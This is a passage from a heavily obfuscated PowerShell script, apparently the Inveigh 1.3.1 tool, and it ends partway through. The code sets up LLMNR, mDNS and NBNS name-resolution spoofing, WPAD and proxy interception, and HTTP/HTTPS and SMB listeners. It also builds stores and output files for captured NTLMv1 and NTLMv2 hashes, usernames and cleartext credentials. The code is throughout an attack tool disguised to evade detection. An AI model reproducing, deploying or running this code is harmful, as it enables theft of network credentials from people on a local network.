 $K8Gmj1 =  [TyPE]("{1}{2}{0}" -F 'Le','hasHT','Ab') ;   &("{3}{1}{2}{0}" -f 'ArIAble','E','T-v','s')  ('K21Wm'+'v') ([TYPe]("{3}{5}{6}{0}{2}{7}{1}{4}" -f 'ty.pRINCIPAl.w','NT','iNDoWS','SySTE','ITY','m.','SEcUri','IdE') ) ;   &("{2}{1}{0}"-f 'm','-itE','Set') VaRIablE:X7K8 ( [TYpE]("{5}{6}{1}{9}{4}{10}{0}{7}{2}{3}{8}"-F 'eN','.','At','iOn.SSLPrOtoc','U','sYsTE','m.SECUrIty','TIc','ols','a','th')) ; &("{0}{2}{1}" -f'Set','TEM','-I') ("v"+"ArIA"+"BLE:"+"o06") ( [TYPE]("{0}{1}{2}{3}{4}" -F'sYSTEM','.','IO.FI','L','E') )  ;   &("{0}{1}" -f 'seT','-item')  VaRiaBlE:ogwF (  [type]("{4}{1}{2}{3}{0}"-f'mILY','EtS.','ADdr','EsSFa','Net.sOCk')  ) ;    $IBrE4n= [TYpe]("{1}{4}{2}{0}{3}"-F 'ETS.SoCKeTt','N','ck','YpE','Et.SO') ;  &("{1}{0}" -f'-ITEm','SeT')  variaBlE:S8x6  ([tYPe]("{2}{0}{3}{5}{1}{4}{6}"-F 's','PROT','Net.','ocke','OColtY','TS.','PE')) ;  $AZq7m  =[Type]("{6}{4}{7}{5}{2}{0}{3}{9}{8}{1}" -f 'ET','CodE','Ck','s.i','m.ne','.So','SySTe','t','oNtROL','oc'); &("{0}{1}{2}"-f'Se','t-iT','eM')  ("V"+"a"+"ri"+"ABle:R"+"6Iy0Q")  (  [TyPe]("{0}{2}{6}{5}{4}{3}{1}" -F 'syStE','S','M','oCKETfLaG','Ets.S','soCK','.net.')  ); &("{0}{1}" -f'SE','t') h1TlV  (  [TYpE]("{1}{2}{3}{0}{8}{6}{5}{7}{4}" -F 'T.SO','SY','stEM.n','e','Y','I','aDdReSsFaM','l','cKeTS.') )  ; &("{0}{1}"-f's','et-ITem') VARiabLe:16G  ( [TyPe]("{7}{5}{1}{0}{2}{6}{8}{4}{3}" -f'NE','M.','T.S','EtTYPE','ck','Ste','OCKEt','Sy','S.so') ) ; $qb64XY  =  [tyPE]("{2}{3}{6}{5}{0}{7}{1}{4}"-F 'T','oLtYP','SYSTeM.nET','.','e','Ro','sOcKETs.p','Oc')  ;   &("{2}{1}{0}" -f 'itEm','eT-','S')  VARIaBLE:IPjas  ( [tYpe]("{0}{3}{1}{2}"-f 'TeXt.','co','DinG','EN') ) ; &("{2}{0}{1}"-f'T-iTe','M','SE')  ('v'+'A'+'rIABl'+'e:J91gQ'+'K')  ([tYPe]("{2}{0}{1}"-f'D','REss','ipad') )  ;   &("{2}{3}{0}{1}" -f 'aR','IaBLE','SET','-v') igu7qm (  [type]("{1}{4}{2}{3}{0}"-f 'ErT','s','M','.conV','ystE')  ); &("{1}{0}{2}" -f't','set-I','Em') ('vA'+'RIaB'+'LE'+':9T2jby') ( [tYpe]("{3}{1}{2}{0}{4}{6}{5}"-F'TeM.teXt.','y','s','S','EnCO','ing','d')  )  ;&("{0}{3}{2}{1}" -f 'seT-v','AblE','i','aR') ("C"+"y"+"j6E1") (  [typE]("{2}{3}{1}{0}" -F'TER','BitconveR','sySte','m.') ) ; $3xP =  [TypE]("{1}{0}" -F 'Y','ARRa')  ;$xpT4kO  =  [tYpE]("{0}{3}{1}{2}"-F 'systeM.N','.iPADDRe','Ss','Et'); &("{3}{1}{2}{0}"-f 'ABLE','T','-VaRi','se') ('5z'+'GH') ([tyPE]("{0}{4}{1}{3}{2}" -F 'RUnSp','cEFaCt','rY','O','A')  );  $7k4= [tYpE]("{1}{2}{0}" -f 'ERSHeLL','po','W');  &("{0}{2}{1}{3}" -f's','Ar','Et-V','iAbLe')  bSD  ([tYpE]("{3}{1}{5}{4}{2}{0}" -f'WAtCh','YsTem.DiAG','.StOP','S','SticS','No'))  ;  &("{2}{0}{1}" -f '-','iteM','SeT')  ("vaR"+"IAbLe:7"+"091"+"A") ([tYPE]("{0}{2}{1}" -f'C','E','ONsOL')  ) ;  function inV`oKE-i`N`VEiGH
{



[CmdletBinding()]
param
( 
    [parameter(maNdAtORy=${fal`se})][Array]${HT`T`PresETdEL`Ay} = ("{1}{0}" -f 'irefox','F'),
    [parameter(ManDATOrY=${F`Alse})][Array]${P`R`oxYIgnOrE} = ("{2}{0}{1}"-f 'i','refox','F'),
    [parameter(mandAtORY=${F`AlSe})][Array]${s`pOofE`RH`oSTsReply} = "",
    [parameter(mAnDaTorY=${fA`Lse})][Array]${SpOOfERhOsT`sIG`N`O`Re} = "",
    [parameter(maNdATORy=${fAl`Se})][Array]${sPOoF`ErI`psr`eplY} = "",
    [parameter(maNDAtoRy=${f`A`LSE})][Array]${Sp`O`O`FERIpSi`gNOre} = "",
    [parameter(MAnDAtoRy=${fA`lsE})][Array]${W`PAddireC`T`hoSTS} = "",
    [parameter(mAndatORy=${F`AL`sE})][Array]${W`p`Ada`UthI`gNore} = ("{2}{0}{1}" -f 'iref','ox','F'),
    [parameter(MANDATORY=${Fal`SE})][Int]${COn`soLeQu`EUe`lI`mIt} = "-1",
    [parameter(MandatorY=${fa`l`SE})][Int]${C`On`so`lEST`ATUS} = "",
    [parameter(MAnDatOry=${F`Alse})][Int]${HT`Tp`po`Rt} = "80",
    [parameter(mAnDATOrY=${FA`L`Se})][Int]${htTps`po`RT} = "443",
    [parameter(MaNDAtOrY=${F`A`LSE})][Int]${hTt`p`RESEtDe`laYt`i`meOuT} = "30",
    [parameter(mAnDatOry=${F`A`lSe})][Int]${ll`mNRt`TL} = "30",
    [parameter(ManDAtORY=${FA`L`SE})][Int]${Md`NSt`Tl} = "120",
    [parameter(mAndaToRy=${fa`lse})][Int]${nbNst`TL} = "165",
    [parameter(ManDatory=${FA`Lse})][Int]${n`BNsbRut`EforC`epaUSe} = "",
    [parameter(MandATorY=${f`AlSE})][Int]${proxY`p`Ort} = ("{0}{1}" -f '8','492'),
    [parameter(mAndAtoRy=${FA`lSe})][Int]${RU`NcOu`Nt} = "",
    [parameter(MAnDAtoRY=${fal`sE})][Int]${run`T`ImE} = "",
    [parameter(ManDaTOry=${F`AL`se})][Int]${WP`AD`Port} = "",
    [parameter(mAnDatory=${Fal`sE})][Int]${spOoFeRL`e`A`R`N`i`NgdELAY} = "",
    [parameter(mANDaTOrY=${fA`LsE})][Int]${Spoo`FErlE`A`R`NIN`gi`NtERVAL} = "30",
    [parameter(maNdAtORy=${Fa`Lse})][String]${h`TTPbA`SICRea`lM} = "IIS",
    [parameter(ManDATOry=${fA`lSe})][String]${H`TTPcOnTe`Nt`T`YPE} = ("{2}{1}{0}"-f'l','htm','text/'),
    [parameter(mandAToRY=${fa`Lse})][String]${H`TT`pDEfAulTFi`le} = "",
    [parameter(mANDAToRy=${FA`lsE})][String]${hT`TPd`e`FAUlTexe} = "",
    [parameter(mANDATOry=${FA`lsE})][String]${hT`T`PReSPonse} = "",
    [parameter(mandaTOrY=${F`ALSe})][String]${H`T`T`PsceRti`sSUer} = ("{1}{0}"-f 'igh','Inve'),
    [parameter(MandATORy=${Fa`lSe})][String]${h`TTPscE`RTS`Ub`je`cT} = ("{1}{0}{2}" -f'alho','loc','st'),
    [parameter(MAnDaTory=${fal`sE})][String]${n`Bn`sB`R`UtEFoRCEhOST} = ("{0}{1}"-f'W','PAD'),
    [parameter(MAnDaTorY=${fA`l`SE})][String]${wp`Adr`ESP`onse} = "",
    [parameter(maNdaToRY=${F`A`Lse})][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]${cHAl`LE`N`Ge} = "",
    [parameter(mAnDATORy=${F`AL`Se})][ValidateSet("Y","N")][String]${C`OnS`ol`eUnI`qUe} = "Y",
    [parameter(MaNdATOry=${fal`SE})][ValidateSet("Y","N")][String]${fI`LEo`UTpUt} = "N",
    [parameter(MANDATOry=${FA`lse})][ValidateSet("Y","N")][String]${FilEuN`i`q`Ue} = "Y",
    [parameter(mAndatoRy=${f`ALse})][ValidateSet("Y","N")][String]${ht`TP} = "Y",
    [parameter(mAndatorY=${f`A`lsE})][ValidateSet("Y","N")][String]${HT`T`PS} = "N",
    [parameter(mANdAToRy=${fA`L`sE})][ValidateSet("Y","N")][String]${Ht`TpsFOrcE`C`ertDeL`etE} = "N",
    [parameter(mandatoRy=${fal`Se})][ValidateSet("Y","N")][String]${L`lmNr} = "Y",
    [parameter(maNdatoRy=${Fa`Lse})][ValidateSet("Y","N")][String]${lo`gO`UtPUt} = "Y",
    [parameter(mANdATorY=${F`A`LsE})][ValidateSet("Y","N")][String]${maCHiN`E`A`ccOu`NTs} = "N",
    [parameter(maNDatory=${fa`L`Se})][ValidateSet("Y","N")][String]${m`dnS} = "N",
    [parameter(mandaToRY=${fA`lSE})][ValidateSet("Y","N")][String]${N`BNs} = "N",
    [parameter(MAndatOry=${f`ALsE})][ValidateSet("Y","N")][String]${nB`NSbR`UtefOR`CE} = "N",
    [parameter(ManDatorY=${Fal`Se})][ValidateSet("Y","N")][String]${OUt`putsTrEaM`o`N`Ly} = "N",
    [parameter(mandaToRY=${fa`Lse})][ValidateSet("Y","N")][String]${P`Roxy} = "N",
    [parameter(MaNdatoRy=${FA`Lse})][ValidateSet("Y","N")][String]${sHO`WHe`lP} = "Y",
    [parameter(mandaTOrY=${F`AlSe})][ValidateSet("Y","N")][String]${S`MB} = "Y",
    [parameter(mAnDAtoRY=${FAl`sE})][ValidateSet("Y","N")][String]${spoofE`RlEA`Rn`i`NG} = "N",
    [parameter(MandAToRY=${fa`lSe})][ValidateSet("Y","N")][String]${S`PO`oFeRrEpeAt} = "Y",
    [parameter(MaNdatORY=${Fa`L`sE})][ValidateSet("Y","N")][String]${STAt`U`SOUTpUT} = "Y",
    [parameter(manDAtORy=${f`A`lSE})][ValidateSet("Y","N")][String]${WP`AD`dIR`ECTFilE} = "Y",
    [parameter(MAndAtoRy=${fA`l`Se})][ValidateSet("Y","N")][String]${ST`ART`UPche`ckS} = "Y",
    [parameter(maNDATORY=${F`Alse})][ValidateSet("Y","N","Low",{"{1}{2}{0}" -f 'm','Me','diu'})][String]${Co`NsoL`EO`UTP`UT} = "N",
    [parameter(maNDATORy=${Fal`sE})][ValidateSet({"{0}{1}" -f'A','uto'},"Y","N")][String]${E`LE`Va`T`edPriVi`LeGe} = ("{1}{0}" -f'to','Au'),
    [parameter(maNdaTorY=${f`A`lse})][ValidateSet({"{2}{1}{0}"-f 'us','nymo','Ano'},{"{0}{1}"-f 'B','asic'},{"{0}{1}" -f 'N','TLM'},{"{0}{2}{1}"-f'N','NoESS','TLM'})][String]${Ht`TPaU`Th} = ("{0}{1}" -f 'NT','LM'),
    [parameter(ManDAtORY=${F`A`lsE})][ValidateSet("QU","QM")][Array]${m`D`NSTypES} = @("QU"),
    [parameter(maNDaToRY=${f`ALSe})][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]${NBNsT`y`Pes} = @("00","20"),
    [parameter(maNDaTorY=${fAL`SE})][ValidateSet({"{0}{1}"-f 'Basi','c'},{"{1}{0}" -f'M','NTL'},{"{1}{2}{0}" -f 'SS','NT','LMNoE'})][String]${pRO`xy`AUTh} = ("{1}{0}" -f'LM','NT'),
    [parameter(MAnDaTORY=${faL`sE})][ValidateSet("0","1","2")][String]${T`oOL} = "0",
    [parameter(mANdatORy=${FAL`SE})][ValidateSet({"{1}{0}{2}"-f'y','Anon','mous'},{"{0}{1}" -f 'Ba','sic'},{"{0}{1}"-f'NT','LM'},{"{0}{1}{2}"-f 'NTLMNo','E','SS'})][String]${Wp`A`da`Uth} = ("{0}{1}" -f'NT','LM'),
    [parameter(mAnDAToRy=${F`A`lSE})][ValidateScript({&("{2}{1}{0}" -f'th','Pa','Test-') ${_}})][String]${fiL`E`OU`T`pUtDiREcT`oRy} = "",
    [parameter(MAnDATorY=${f`AL`SE})][ValidateScript({&("{2}{0}{1}"-f'a','th','Test-P') ${_}})][String]${ht`T`PDIr} = "",
    [parameter(mandATOrY=${FA`l`sE})][Switch]${I`NSPE`cT},
    [parameter(MaNDaTOry=${fA`lse})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${h`Ttp`ip} = ("{2}{1}{0}"-f'.0','0','0.0.'),
    [parameter(mAnDatory=${fA`L`se})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${ip} = "",
    [parameter(MAnDATORY=${f`Al`sE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${nB`N`sBrutEFOR`cEtaRg`eT} = "",
    [parameter(mandatOry=${F`AlsE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${Pr`oxy`IP} = ("{0}{2}{1}"-f'0.','0.0','0.'),
    [parameter(mANDATORY=${Fa`lSe})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${sP`OOF`ERIP} = "",
    [parameter(maNdatORy=${f`AlSE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${w`p`ADIp} = "",
    [parameter(VAluEfrOMReMaininGarGuMEnTS=${tR`UE})]${i`Nva`lid_par`AME`TER}
)

if (${inV`A`Lid_Pa`R`AMeTer})
{
    &("{0}{3}{1}{2}"-f'W','te-Outp','ut','ri') "Error:$($invalid_parameter) is not a valid parameter "
    throw
}

${IN`VEig`h_VE`RsiON} = ("{0}{1}" -f '1.3','.1')

if(!${iP})
{ 
    ${IP} = (&("{3}{0}{2}{1}"-f 'est-Co','ion','nnect','T') ("{1}{0}" -f '0.0.1','127.') -count 1 | &("{2}{0}{4}{3}{1}" -f'ele','ject','S','b','ct-O') -ExpandProperty ("{2}{1}{0}" -f 'ss','ddre','Ipv4A'))
}

if(!${S`pOoFe`RIP})
{
    ${S`pooFE`RIp} = ${I`P}  
}

if(${HT`T`p`dEFAultf`I`LE} -or ${H`TtP`De`FaULTExE})
{

    if(!${HTt`Pd`Ir})
    {
        &("{0}{2}{1}" -f 'Write-O','t','utpu') ("{4}{7}{11}{2}{0}{3}{17}{12}{9}{16}{10}{14}{1}{5}{13}{15}{6}{8}"-f'-HTT','le or -HTT',' ','PDir when using','Error','P','faultE',':','XE','her -HTTPDef','tF','You must specify an','it','D','i','e','aul',' e')
        throw
    }

}

if(${WPAD`iP} -or ${wpA`dP`ORt})
{

    if(!${w`P`ADIP})
    {
        &("{0}{3}{2}{1}" -f 'Writ','tput','Ou','e-') ("{1}{5}{2}{7}{3}{8}{0}{6}{4}"-f'WPA','Error:You','go w','t','P',' must specify a -WPADPort to ','DI','i','h -')
        throw
    }

    if(!${WPA`d`p`oRt})
    {
        &("{2}{0}{1}"-f'te-Ou','tput','Wri') ("{2}{9}{7}{1}{3}{6}{4}{0}{8}{10}{5}"-f 'DIP to go wit','pec','Error:','ify ','PA','DPort','a -W','t s','h','You mus',' -WPA')
        throw
    }

}

if(${nBNSbRut`e`FOr`cE} -eq 'Y' -and !${nbns`BRut`e`FO`R`CEta`RGEt})
{
    &("{2}{1}{0}"-f'put','e-Out','Writ') ("{6}{0}{4}{9}{13}{8}{11}{5}{1}{14}{7}{3}{12}{2}{10}" -f'us','Brut','-NBNSBruteF','a','t',' -NBNS','Error:You m','if en','y',' s','orce',' a','bling ','pecif','eForceTarget ')
    throw
}

if(!${fILE`OuTpuT`DIrec`T`ory})
{ 
    ${oUTpu`T_Dir`ecT`Ory} = ${P`wd}."p`AtH"
}
else
{
    ${ou`TPuT_d`Ir`EctOry} = ${f`IlEou`T`puTD`iR`eC`ToRY}
}

if(!${i`NVeI`gh})
{
    ${GloBa`L:in`V`eI`gH} =   ( &('LS') vAriAble:k8gMj1  ).vAlUE::("{1}{3}{0}{2}" -f 'ronize','Sync','d','h').Invoke(@{})
    ${IN`V`eIGH}."CL`EAR`TexT_li`ST" = &("{0}{1}{2}" -f 'Ne','w-Ob','ject') ("{6}{2}{4}{5}{3}{0}{1}"-f 'i','st','m.Co','.ArrayL','llectio','ns','Syste')
    ${i`NV`EigH}."i`P_c`APtUrE_l`IST" = &("{2}{0}{1}" -f'ec','t','New-Obj') ("{4}{5}{3}{0}{1}{2}" -f'ctions.A','rra','yList','Colle','System','.')
    ${Inv`eIGh}."l`oG" = &("{1}{0}{2}"-f 'e','N','w-Object') ("{5}{7}{0}{4}{1}{2}{3}{6}"-f 't','ion','s.','ArrayL','em.Collect','Sy','ist','s')
    ${iN`Ve`iGh}."NTLm`V1_l`iSt" = &("{2}{1}{0}" -f 'ject','ew-Ob','N') ("{2}{4}{1}{5}{3}{6}{0}" -f 'ayList','m.Collecti','Syst','r','e','ons.A','r')
    ${iN`V`EigH}."nT`lmV`1`_usernaM`e_L`ISt" = &("{1}{3}{2}{0}"-f'ct','Ne','Obje','w-') ("{2}{6}{1}{8}{0}{3}{4}{7}{5}" -f'i','Co','Syste','ons','.Arr','ist','m.','ayL','llect')
    ${I`NVE`Igh}."NTlmv2_`l`isT" = &("{0}{2}{1}" -f'Ne','ect','w-Obj') ("{4}{1}{2}{5}{3}{6}{7}{0}" -f'ist','C','ol','Ar','System.','lections.','ray','L')
    ${IN`VE`iGh}."NTlmV2_`U`sErnaM`E_L`iST" = &("{2}{0}{1}"-f 'ew-Objec','t','N') ("{7}{2}{1}{0}{6}{4}{5}{3}"-f'.Co','em','t','rayList','s.','Ar','llection','Sys')
    ${I`N`VEiGh}."pOSt_`R`E`qu`e`ST_list" = &("{2}{0}{1}"-f'ew-Ob','ject','N') ("{0}{3}{8}{5}{2}{4}{1}{7}{6}" -f'Sy','on','t','stem.Co','i','ec','.ArrayList','s','ll')
    ${I`NVeI`GH}."s`MbRel`Ay_F`AI`led_`l`iSt" = &("{2}{0}{1}" -f'-','Object','New') ("{3}{2}{5}{4}{0}{6}{1}{7}"-f 'o','s.','.Col','System','cti','le','n','ArrayList')
    ${iN`VeI`gh}."Valid`_hoSt_LI`st" = &("{1}{3}{0}{2}"-f'Obj','Ne','ect','w-') ("{5}{6}{4}{7}{2}{1}{0}{3}{8}"-f 'Arra','ns.','tio','yL','C','Syste','m.','ollec','ist')
}

if(${In`V`eigH}."rU`NniNg")
{
    &("{1}{0}{2}{3}"-f'O','Write-','ut','put') ("{5}{0}{3}{10}{7}{13}{11}{4}{6}{2}{1}{12}{9}{8}" -f'rror','ng, use','nni',':',' ','E','ru','e-Inve','h','nveig','Invok','gh is already',' Stop-I','i')
    throw
}

if(${httP`_`lISt`ENEr}."I`sLI`sten`Ing" -and !${iNVe`IgH}."R`E`laY`_runNINg")
{
    ${ht`TP`_L`isteN`er}.("{1}{0}"-f'op','St').Invoke()
    ${H`TTP_`liSTEN`Er}.("{0}{1}" -f'Cl','ose').Invoke()
}

if(!${IN`VEiGh}."rELay_r`Unni`NG")
{
    ${InVE`IgH}."cLEArte`xt_FILE_`qUE`UE" = &("{0}{1}{2}"-f 'New','-','Object') ("{5}{4}{3}{1}{0}{2}"-f 'ArrayLi','ons.','st','em.Collecti','yst','S')
    ${I`Nve`igh}."COnsOLE`_Qu`Eue" = &("{1}{2}{0}"-f 'Object','New','-') ("{5}{6}{0}{3}{1}{4}{7}{2}" -f'ct','o','ist','i','ns','Syste','m.Colle','.ArrayL')
    ${INV`EiGH}."H`TtP_C`HA`lleNGe_QUeue" = &("{2}{3}{0}{1}" -f'je','ct','New-O','b') ("{3}{4}{5}{0}{2}{1}"-f 'ay','ist','L','Syste','m.Collections.Ar','r')
    ${inv`EIGH}."lOg_`FilE_`Qu`eUe" = &("{0}{1}{3}{2}" -f 'N','ew','t','-Objec') ("{1}{2}{4}{0}{3}"-f 'o','Syste','m.','llections.ArrayList','C')
    ${IN`Ve`Igh}."nTlM`V1_FiL`e_`qU`eue" = &("{2}{0}{1}" -f'-Obje','ct','New') ("{3}{5}{1}{0}{4}{2}"-f 'tions.Arr','llec','t','Sys','ayLis','tem.Co')
    ${I`NveIGH}."Nt`l`M`V2_`FIle_QUe`Ue" = &("{2}{0}{1}" -f'b','ject','New-O') ("{6}{0}{2}{7}{5}{4}{3}{1}"-f'stem.Collec','ist','t','L','rray','ons.A','Sy','i')
    ${i`Nv`EIgH}."pOSt`_R`eqU`esT_`FiLe`_`Queue" = &("{0}{2}{1}" -f 'New-O','ect','bj') ("{4}{7}{5}{3}{1}{6}{8}{2}{0}" -f 'ist','Arr','L','lections.','S','.Col','a','ystem','y')
    ${INVE`i`GH}."S`Ta`TUS`_QUeUe" = &("{2}{1}{0}" -f 'Object','ew-','N') ("{6}{5}{2}{3}{1}{0}{4}" -f's','.ArrayLi','ction','s','t','tem.Colle','Sys')
    ${inVe`IGH}."cOnSoLE_`INP`Ut" = ${TR`Ue}
    ${I`N`VeIgh}."cO`N`soL`e_oUTP`Ut" = ${f`AlSE}
    ${in`V`EiGh}."FIlE_O`UTP`Ut" = ${fAL`sE}
    ${in`VEiGh}."htt`Ps_E`xI`s`TI`N`g_ceRTI`FIcA`Te" = ${fal`Se}
    ${iN`V`EiGh}."HT`TPs`_ForCE_cE`R`TIfIc`A`Te_D`e`l`eTe" = ${f`A`lSe}
    ${in`Ve`IGh}."lO`G_Ou`TpuT" = ${Tr`Ue}
    ${iN`VEigH}."c`LeArtEXt_O`UT_`F`Ile" = ${O`UT`Put_di`ReC`TORy} + ((("{4}{0}{3}{5}{1}{2}"-f'nveig','leartext.','txt','h','{0}I','-C'))  -F[ChAR]92)
    ${i`NVE`Igh}."LOG_O`U`T_fILe" = ${Out`pUt`_dIR`EcTo`Ry} + ((("{2}{1}{3}{4}{0}"-f'xt','Inveigh-Lo','fyC','g.','t'))."REP`l`ACe"(([Char]102+[Char]121+[Char]67),'\'))
    ${iN`VE`iGH}."Ntl`Mv`1_OU`T_fiLe" = ${OUt`P`Ut_d`I`ReCtOrY} + ((("{3}{4}{2}{1}{6}{0}{5}" -f'.','igh-NT','Inve','l','yX','txt','LMv1'))."ReP`L`AcE"(([Char]108+[Char]121+[Char]88),[strInG][Char]92))
    ${In`VEIGh}."NT`l`mv2_Ou`T`_FIle" = ${OUtPU`T_dirEC`T`Ory} + ((("{2}{3}{4}{1}{0}"-f 't','v2.tx','aebInv','e','igh-NTLM'))."REPl`ACe"(([CHar]97+[CHar]101+[CHar]98),[sTrING][CHar]92))
    ${InV`EiGH}."PosT`_`REqUeSt_ouT_`FILe" = ${oUT`put_d`I`ReCTO`Ry} + ((("{2}{3}{1}{0}{4}" -f'ormInpu','eigh-F','metI','nv','t.txt'))."r`ePla`Ce"(([chAr]109+[chAr]101+[chAr]116),[StriNg][chAr]92))
}

if(${Elev`AT`Edp`R`IVilE`Ge} -eq ("{1}{0}"-f'to','Au'))
{
    ${eL`eVAT`ed`_PRIvIl`EGE} = [Bool]((  (&("{1}{0}"-f'R','di') ("VAriaB"+"le:K21"+"W"+"Mv")).ValuE::("{1}{2}{0}"-f 'nt','GetC','urre').Invoke())."g`R`oUps" -match ("{1}{0}{2}{3}" -f '1-5','S-','-','32-544'))
}
else
{
 
    if(${e`le`VAteDPr`ivIlEge} -eq 'Y')
    {
        ${ELeVatE`d_pRi`V`IL`eGE} = ${tr`Ue}
    }
    else
    {
        ${el`eva`TEd`_p`RivilEGE} = ${F`AlSe}
    }
    
}

if(${sT`A`RtUp`CheCks} -eq 'Y')
{

    ${FIr`E`Wall_`St`AtUs} = &("{0}{1}" -f'n','etsh') ("{1}{2}{0}" -f'wall','advfi','re') ("{1}{0}"-f 'w','sho') ("{0}{2}{1}"-f 'al','files','lpro') ("{0}{1}" -f 'stat','e') | &("{2}{3}{1}{0}"-f'ect','e-Obj','Wh','er') {${_} -match 'ON'}

    if(${Ht`Tp} -eq 'Y')
    {
        ${HTT`P_`p`OrT`_chEck} = &("{2}{0}{1}" -f'ts','tat','ne') -anp ("{1}{0}"-f 'CP','T') | &("{0}{1}" -f 'find','str') ("{0}{2}{1}" -f'LISTEN','G','IN') | &("{1}{0}{2}"-f 'nds','fi','tr') (("{1}{2}{0}{3}{4}{6}{5}" -f'TPIP:','/','C:7lgHT','7lg','HTTP','ort ','P'))."r`e`plAcE"(([chAr]55+[chAr]108+[chAr]103),[stRINg][chAr]36)
    }

    if(${h`TTpS} -eq 'Y')
    {
        ${h`TTpS_PO`Rt_CHE`CK} = &("{0}{1}"-f'ne','tstat') -anp ("{0}{1}"-f 'TC','P') | &("{2}{1}{0}" -f'tr','inds','f') ("{0}{2}{1}" -f'L','ING','ISTEN') | &("{1}{2}{0}"-f'str','fin','d') (("{4}{2}{0}{1}{3}"-f 'bHTTPIP:SGbHTTPS','Por','G','t ','/C:S'))."r`EpL`ACe"('SGb',[StrIng][CHaR]36)
    }

    if(${PRO`XY} -eq 'Y')
    {
        ${pRo`xy`_P`orT_CH`Eck} = &("{0}{1}{2}" -f 'n','ets','tat') -anp ("{0}{1}"-f'TC','P') | &("{0}{2}{1}" -f'f','tr','inds') ("{0}{1}{2}"-f'LISTE','N','ING') | &("{1}{0}"-f'str','find') ((("{0}{4}{5}{6}{1}{3}{2}" -f '/','uzpP','ort ','roxyP','C:uzpHT','TP','IP:'))-CrepLAcE'uzp',[chaR]36)
    }

    if(${l`LM`Nr} -eq 'Y' -and !${elEVAtED_P`R`I`VIle`ge})
    {
        ${l`l`mN`R_PoRt_ChE`Ck} = &("{2}{1}{0}"-f 't','etsta','n') -anp ("{0}{1}" -f 'U','DP') | &("{0}{1}{2}"-f 'f','inds','tr') ("{3}{1}{4}{2}{0}" -f' ','C','5','/',':0.0.0.0:535')
    }

    if(${M`DNs} -eq 'Y' -and !${el`eV`A`Ted_`pRiVI`lege})
    {
        ${MDNS`_P`ort_C`He`cK} = &("{2}{1}{0}" -f 'at','st','net') -anp ("{0}{1}"-f 'U','DP') | &("{1}{0}"-f 'str','find') ("{2}{1}{3}{0}"-f'5353 ','.0.','/C:0','0.0:')
    }

}

if(!${ElEvAt`eD_`priVi`LeGe})
{

    if(${htT`PS} -eq 'Y')
    {
        &("{1}{2}{0}" -f'put','Wri','te-Out') ("{3}{8}{2}{9}{1}{0}{7}{5}{4}{6}" -f'lev','es e','HTTPS','Erro','le','rivi','ges','ated p','r:-',' requir')
        throw
    }

    if(${SP`o`OF`ErlEARnIng} -eq 'Y')
    {
        &("{2}{0}{1}"-f't','put','Write-Ou') ("{1}{6}{7}{11}{12}{9}{13}{8}{5}{2}{4}{10}{3}{0}" -f 'ges','Erro','leva',' privile','te','e','r:','-SpooferL','s ','rning','d','e','a',' require')
        throw
    }

    ${n`BNS} = "Y"
    ${S`mB} = "N"

}

${iNVe`IgH}."HOsTN`A`mE_SP`oOF" = ${F`Alse}
${IN`VeIGh}."r`UNNiNG" = ${Tr`Ue}

if(${st`A`TUs`o`UtpUT} -eq 'Y')
{
    ${IN`VE`iGH}."sta`TUS_`OutP`Ut" = ${T`RUE}
}
else
{
    ${in`VEIGH}."s`TatuS_o`UtP`Ut" = ${Fa`lsE}
}

if(${O`UT`PuTsT`REa`MON`Ly} -eq 'Y')
{
    ${I`NV`eiGH}."ou`TP`UT_`STRE`AM_on`ly" = ${tr`Ue}
}
else
{
    ${I`NVei`gH}."OutPU`T_sTREam_O`N`LY" = ${f`ALse}
}

if(${i`N`SPEct})
{

    if(${elEv`ATEd_pRi`Vi`lEgE})
    {
        ${llM`NR} = "N"
        ${mD`Ns} = "N"
        ${nB`NS} = "N"
        ${HT`Tp} = "N"
        ${ht`TPS} = "N"
        ${P`RoXy} = "N"
    }
    else
    {
        ${HT`TP} = "N"
        ${H`TTPS} = "N"
        ${Pr`Oxy} = "N"
    }

}

if(${t`OoL} -eq 1) 
{
    ${INV`e`Igh}."t`oOL" = 1
    ${iNvE`I`gh}."oU`T`PUT_ST`REAm_OnLy" = ${Tr`UE}
    ${i`N`VeiGH}."Ne`Wl`INe" = ""
    ${COnsol`eouTp`Ut} = "N"

}
elseif(${t`OOl} -eq 2) 
{
    ${INV`E`iGh}."tO`oL" = 2
    ${iN`Ve`igh}."OUT`PUt_`ST`RE`Am_`ONlY" = ${TR`UE}
    ${Inv`eIGh}."ConS`OLe_In`puT" = ${Fa`L`sE}
    ${i`NVeIgh}."Newl`InE" = "`n" 
    ${LO`Go`UTpUt} = "N"
    ${sh`Ow`HELp} = "N"

    switch (${cOnS`oL`e`ou`Tput})
    {

        'Low'
        {
            ${coNS`O`l`e`OuTPUT} = "Low"
        }

        ("{2}{0}{1}"-f 'di','um','Me')
        {
            ${COnS`o`lE`outPut} = ("{0}{1}" -f'M','edium')
        }

        ("{2}{1}{0}" -f 't','efaul','d')
        {
            ${cON`Sol`e`ouT`Put} = "Y"
        }

    }

}
else
{
    ${In`VeI`gH}."T`ool" = 0
    ${InvE`i`gH}."nEWL`INE" = ""
}


${i`NVe`iGh}."S`T`A`TUS_qUEUe".("{1}{0}" -f 'dd','A').Invoke(("Inveigh $inveigh_version started at $(Get-Date -format 's') "))  > ${n`ULl}

if(${Fi`L`eouTpUt} -eq 'Y')
{
    ${inV`eigh}."LoG_fiLe`_q`UEUE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Inveigh $inveigh_version started ")) > ${n`ULl}
}

if(${L`o`GOUt`pUT} -eq 'Y')
{
    ${iNVE`IGh}."L`Og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh started ")) > ${nU`LL}
    ${inv`eI`gH}."loG_O`Ut`PUT" = ${T`RuE}
}
else
{
    ${iN`VEi`gh}."LO`g_O`UtPut" = ${faL`se}
}

if(${eLeVAt`e`D`priVI`lEge} -eq 'Y' -or ${E`Le`V`ATed_pR`ivilEge})
{
    ${in`VE`IGh}."StaTU`s_`que`UE".("{0}{1}"-f 'Ad','d').Invoke(("{3}{2}{4}{6}{1}{0}{7}{8}{5}"-f 'e','il','le','E','vate','bled','d Priv','g','e Mode = Ena'))  > ${nu`ll}
